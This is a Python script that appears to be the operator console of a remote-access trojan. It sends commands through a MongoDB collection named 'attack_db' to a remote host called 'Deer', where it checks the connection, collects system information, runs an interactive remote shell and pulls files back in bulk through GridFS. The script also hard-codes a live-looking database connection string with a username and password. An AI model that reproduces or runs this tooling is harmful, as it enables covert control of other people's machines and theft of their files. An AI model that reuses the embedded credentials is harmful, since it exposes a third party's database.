
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
import gridfs
import time
import argparse
import shlex

uri = "mongodb+srv://papercode:3aOqN02ZVrIvAaO3@web.pxkfwja.mongodb.net/?retryWrites=true&w=majority&appName=web"

# Create a new client and connect to the server
client = MongoClient(uri, server_api=ServerApi('1'))

# Send a ping to confirm a successful connection
try:
    client.admin.command('ping')
    print("Successfully connected to Database...")
except Exception as e:
    print(e)

def send(cmd):
    db = client['attack_db']
    collection = db['attack']
    
    collection.insert_one({"attack": cmd, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())})

    return collection

def listen():
     while True:
        db = client['attack_db']
        collection = db['attack']
        attacks = collection.find().sort("timestamp", 1)

        for attack in attacks:
            return attack['attack']
        
def delete(attack):
    db = client['attack_db']
    collection = db['attack']

    collection.delete_one({"_id": attack['_id']})

def check_deer_state(timeout_seconds=10):
    collection = send("deer-state-pending")

    start = time.time()
    while True:
        listened = listen()   # your original listen()

        if listened == "deer-state-ok":
            print("Deer is connected")
            attacks = collection.find().sort("timestamp", 1)
            for attack in attacks:
                delete(attack)
            break

        # check if timeout expired
        if time.time() - start >= timeout_seconds:
            print("Timed out waiting for deer-state-ok")
            attacks = collection.find().sort("timestamp", 1)
            for attack in attacks:
                delete(attack)
            break
        
def check_system_info(args, timeout_seconds=10):
    collection = send(system_info_command(args))
    start = time.time()

    while True:
        listened = listen()

        if listened.startswith("system-info:"):
            info = listened[len("system-info:"):].strip()
            print(f"System Info: {info}")
            attacks = collection.find().sort("timestamp", 1)
            for attack in attacks:
                delete(attack)
            break

        # check if timeout expired
        if time.time() - start >= timeout_seconds:
            print("Timed out waiting for system-info")
            attacks = collection.find().sort("timestamp", 1)
            for attack in attacks:
                delete(attack)
            break

def system_info_command(args):
    if args.a:       
        sections = ["basic"] + args.a
    elif args.o:     
        sections = args.o
    else:
        sections = ["basic"]

    cmd_parts = []

    if "basic" in sections:
        cmd_parts.append("basic")
    elif sections:
        cmd_parts.append(sections[0])

    for section in sections:
        if section != cmd_parts[0]:
            cmd_parts.append(section)

    return "system-info-" + "-".join(cmd_parts)


def shell():
    print("=============== INSIDE SHELL ===============")
    while True:
        shell = input("shell> ")
        if shell in ["exit", "quit"]:
            print("Exiting shell...")
            break
        else:
            collection = send(f"shell-{shell}")
        while True:
            listened = listen()
            if listened.startswith("shelloutput:"):
                attacks = collection.find().sort("timestamp", 1)
                for attack in attacks:
                    delete(attack)
                output = listened[len("shelloutput:"):].strip()
                print(output)
                break

def upload_file(filename):
    db = client['attack_db']
    collection = send(f"upload-{filename}")
    while True:
        listened = listen()
        if listened.startswith("upload:"):
            attacks = collection.find().sort("timestamp", 1)
            for attack in attacks:
                delete(attack)

            output = listened[len("upload:"):].strip()
            
            print(output + "Saving...")
            
            fs = gridfs.GridFS(db)
            with open(filename, "wb") as f:
                f.write(fs.get_last_version(filename).read())
            print(f"File saved as {filename}")

            break

if __name__ == "__main__":
    
    parser = argparse.ArgumentParser(prog="", description="")
    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    check_connection = subparsers.add_parser("deer-state", help="Check connection state with Deer")
    check_connection.add_argument("-t", "--timeout", type=int, default=10, help="Timeout in seconds (default: 10)")

    check_system = subparsers.add_parser("system-info", help="Get system information of Deer")
    check_system.add_argument("-t", "--timeout", type=int, default=10, help="Timeout in seconds (default: 10)")
    check_system.add_argument("-a", nargs="+", help="Add sections (hardware, internet)")
    check_system.add_argument("-o", nargs="+", help="Show only these sections (basic, hardware, internet)")

    open_shell = subparsers.add_parser("shell", help="Open an interactive shell with Deer")

    upload_parser = subparsers.add_parser("upload", help="Upload a file from deer to panther")
    upload_parser.add_argument("-b", "--bulk", type=str, help="Upload multiple files from a text file containing file paths")
    upload_parser.add_argument("-f", "--filename", required=True, type=str, help="Source file path on Deer")
    upload_parser.add_argument("-t", "--timeout", type=int, default=20, help="Timeout in seconds (default: 20)")


    while True:
        cmd = input(">> ")

        if not cmd:
            continue

        try:
            args = parser.parse_args(shlex.split(cmd))
        except SystemExit:
            # argparse prints the error automatically
            # just continue the loop instead of exiting
            continue
        except Exception as e:
            print(f"Error parsing command: {e}")
            continue

        # now safely use args.command
        if args.command == "deer-state":
            check_deer_state(timeout_seconds=args.timeout)
        elif args.command == "system-info":
            check_system_info(args, args.timeout)
        elif args.command == "shell":
            shell()
        elif cmd in ["exit", "quit"]:
            print("Exiting...")
            break
        elif args.command == "upload":
            if args.bulk:
                try:
                    with open(args.bulk, "r") as f:
                        files = [line.strip() for line in f if line.strip()]
                    for file in files:
                        print(f"Uploading {file}...")
                        upload_file(file)
                except Exception as e:
                    print(f"Error reading bulk file: {e}")
            else:
                upload_file(args.filename)
        else:
            print("Unknown command...")

        